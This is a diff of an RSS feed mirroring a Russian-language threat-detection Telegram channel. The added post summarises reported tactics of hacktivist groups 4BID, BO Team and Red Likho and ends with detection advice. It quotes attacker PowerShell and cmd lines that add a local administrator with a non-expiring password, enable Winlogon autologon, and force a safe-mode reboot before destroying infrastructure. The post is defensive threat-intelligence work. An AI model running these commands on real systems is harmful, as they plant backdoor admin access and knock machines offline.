@@ -1,5 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Detection is easy</title><link>https://t.me/detectioneasy</link><description>Detections</description><language>ru</language><lastBuildDate>Tue, 02 Dec 2025 10:49:23 +0000</lastBuildDate><item><title>Распространение вредоносов через USB-накопители остается актуальным способом. Цепочка заражения описана в отчете AhnLab и Google</title><link>https://t.me/detectioneasy/300</link><description>Всем привет! 💻✌️
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Detection is easy</title><link>https://t.me/detectioneasy</link><description>Detections</description><language>ru</language><lastBuildDate>Wed, 03 Dec 2025 18:52:16 +0000</lastBuildDate><item><title>Коллеги из ЛК поделились TTP хактивистских группировок 4BID, BO Team и Red Likho</title><link>https://t.me/detectioneasy/302</link><description>Всем привет! 💻✌️
+Коллеги из ЛК поделились TTP хактивистских группировок 4BID, BO Team и Red Likho
+Для подготовки инфраструктуры к уничтожению запускался ps1-скрипт, одна из возможностей которого создание локального пользователя с параметрами PasswordExpires, Disabled = FALSE и добавление его в группу локальных администраторов
+$userName = "[REDACTED]"
+$password = "[REDACTED]"
+$domain = "."
+$userExists = net user $userName 2&gt;$null
+$addUser = net user $userName $password /add
+wmic useraccount where "name='$userName'" set PasswordExpires=FALSE | Write-Log
+wmic useraccount where "name='$userName'" set Disabled=FALSE | Write-Log
+$group = (Get-LocalGroup -SID "S-1-5-32-544").Name
+net localgroup $group $userName /add | Write-Log
+Далее, хост настраивается для автоматического входа с созданным пользователем
+Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "AutoAdminLogon" -Value "1" | Write-Log
+Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultUserName" -Value $userName | Write-Log
+Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultPassword" -Value $password | Write-Log
+Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultDomainName" -Value $domain | Write-Log
+Второй индикатор подготовки к уничтожению — перевод системы в безопасный режим с сетью:
+cmd.exe /Q /c bcdedit /set {current} safeboot network &amp;&amp; shutdown -r -f -t 0 1&gt; \Windows\Temp\WsMeHC 2&gt;&amp;1
+🔭 Обнаружение:
+🔤 мониторинг создания локальных пользователей и их добавления в группу администраторов
+🔤 хантим ключи реестра SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+🔤 отслеживаем запуск bcdedit /set {current} safeboot network
+#detection@detectioneasy
+#ttp@detectioneasy</description><pubDate>Wed, 03 Dec 2025 18:52:16 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_302</guid></item><item><title>Распространение вредоносов через USB-накопители остается актуальным способом. Цепочка заражения описана в отчете AhnLab и Google</title><link>https://t.me/detectioneasy/300</link><description>Всем привет! 💻✌️
 Распространение вредоносов через USB-накопители остается актуальным способом. Цепочка заражения описана в отчете AhnLab и Google
 👨‍💻 Как это работает?
 🔤На USB-накопители размещается ярлык USB Drive.lnk и скрытые папки sysvolume и USB Drive
